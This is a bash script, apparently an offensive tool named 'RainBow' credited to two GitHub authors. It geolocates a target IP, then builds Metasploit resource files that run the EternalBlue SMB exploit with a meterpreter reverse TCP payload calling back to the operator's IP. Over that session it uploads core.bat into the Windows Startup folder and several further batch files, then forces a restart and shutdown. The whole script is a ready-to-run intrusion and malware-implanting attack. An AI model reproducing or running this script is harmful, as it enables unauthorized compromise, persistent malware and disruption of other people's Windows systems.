#!/bin/bash
i=$((8))
j=$((1))
clear
echo -e " \e[34m-<0>-<0>-\e[0m Looking For Dependencies !"
sleep 2.4
if [ $( figlet rainblue | wc -c ) -eq "0" ]; then   # REQUIREMENTS CHECK
   clear
   sleep 1
   echo " Dependencies Not Installed , Performing Automatic Installation !"
   sleep 3
   apt install -y figlet curl
else
   echo " Dependencies Satisfied !"
fi
sleep 3
clear
while [ $i -le 22 ]; do 
    cut -c$j-$i intro.txt | echo -e "\e[$(($i+23))m$(figlet)\e[0m"  # OPENING ART
    sleep 0.7
    if [ $i -ne 22 ]; then
       clear 
    fi
    i=$(($i+1))
    j=$((9))
done
echo -e "\t\t\t\t\t  By Khusi-docker & PhiVault" 
echo -e "\t\t\t\t\t  GitHub Khusi-docker - \e[34mhttps://github.com/Khusi-docker\e[0m"
echo -e "\t\t\t\t\t  GitHub PhiVault - \e[34mhttps://github.com/PhiVault\e[0m.  V1.2"

read -p "Enter Target IP -> " tip
read -p "Enter Your IP -> " vic
sleep 1
echo -e "\e[31m\nAnalzying Target"
if [ $( ping -c 1 $tip | grep "1 received" | wc -c ) -eq "60" ]; then
   sleep 1
   echo -e "\nTarget Locked & Connected !\n\nChecking For RainBow MalWare\n"
   ip=$( ping -c 1 $tip | grep PING | cut -d ' ' -f3 | tr -d '(',')' )
   echo -e "Target Located In\e[32m$( curl -s ipinfo.io/$ip | grep "country" | cut -d ':' -f2 )\e[31mCounty\n"
   echo -e "Target In\e[32m$( curl -s ipinfo.io/$ip | grep "city" | cut -d ':' -f2 )\e[31mCity\n"
   echo -e "Target Current Region is\e[32m$( curl -s ipinfo.io/$ip | grep "region" | cut -d ':' -f2 )\n\e[31m"
   echo -e "Here are Target Co-ords\e[32m$( curl -s ipinfo.io/$ip | grep "loc" | cut -d ':' -f2 )\n\e[31m"
   echo -e "Target Organization Name -\e[32m $( curl -s https://ipwhois.app/json/$tip | cut -d ':' -f19 | cut -d ',' -f1 )\e[31m\n"
   if [ -f core.bat ]; then
      sleep 1
      echo -e "MalWare Arranged\n"
      echo -e "set payload windows/x64/meterpreter/reverse_tcp\nuse exploit/windows/smb/ms17_010_eternalblue" > vuln.rc
      echo -e "set lhost $vic\nset rhosts $tip\nexploit -z\nexit -y" >> vuln.rc
      sleep 1
      echo -e "Please Wait , We are Checking Vulnerability , It take few minutes\n"
      vcheck=$( msfconsole -q -r vuln.rc | grep -o "WIN" | wc -c ) 
      if [ $vcheck -eq "4" ]; then
         echo -e "\nTarget is Vulnerable Performing \e[34mRainBow Injection\e[31m ||----IIIIIIII--- \e[0m"
         echo -e "set payload windows/x64/meterpreter/reverse_tcp\nuse exploit/windows/smb/ms17_010_eternalblue" > snakebow.rc
         echo -e "set lhost $vic\nset rhosts $tip\nexploit -z" >> snakebow.rc
         echo -e "sessions -i 1 -C cd C:/ProgramData/Microsoft/Windows/'Start Menu'/Programs/Startup" >> snakebow.rc
         echo -e "sessions -i 1 -C upload core.bat" >> snakebow.rc
         echo -e "sessions -i 1 -C cd ..\nsessions -i 1 -C upload cmd1.bat\nsessions -i 1 -C upload cmd2.bat\nsessions -i 1 -C upload cmd3.bat\nsessions -i 1 -C upload cmd4.bat\nsessions -i 1 -C upload cmd5.bat\nsessions -i 1 -C upload cmd6.bat\nsessions -i 1 -C upload cmd7.bat\nsessions -i 1 -C upload cmd8.bat\nsessions -i 1 -C upload cmd9.bat\nrestart\nshutdown\nsessions -k 1\nexit -y" >> snakebow.rc
         sleep 2
         msfconsole -r snakebow.rc
         echo -e "\n Monitoring Target Behaviour , Please Wait!"
         sleep 11
         if [ $( ping -c 1 $tip | grep "1 received" | wc -c ) -eq "60" ]; then
            echo -e "\n\e[34m Attack Completed , Target Up \e[0m"
         else
            echo -e "\n\e[34m Attack Completed , < Target Down > !\e[0m"
         fi
      else
         echo -e "\nAttack Failed ! \n\n\e[32m Reattempting , Please Wait\n\e[31m"
         vcheck=$( msfconsole -q -r vuln.rc | grep -o "WIN" | wc -c ) 
         if [ $vcheck -eq "4" ]; then
             msfconsole -r snakebow.rc
             echo -e "\n Monitoring Target Behaviour , Please Wait!"
             sleep 11
             if [ $( ping -c 1 $tip | grep "1 received" | wc -c ) -eq "60" ]; then
                echo -e "\n\e[34m Attack Completed , Target Up \e[0m"
             else
                echo -e "\n\e[34m Attack Completed , < Target Down > !\e[0m"
             fi
         else
             echo -e "\n Attack Failed !"
         fi
      fi
   else
      sleep 1
      echo -e "MalWare Not Found\n\nAborted .."
   fi
else
   sleep 1
   echo "Target Unreachable , Try Again Later !"
fi
echo -e "\e[0m"
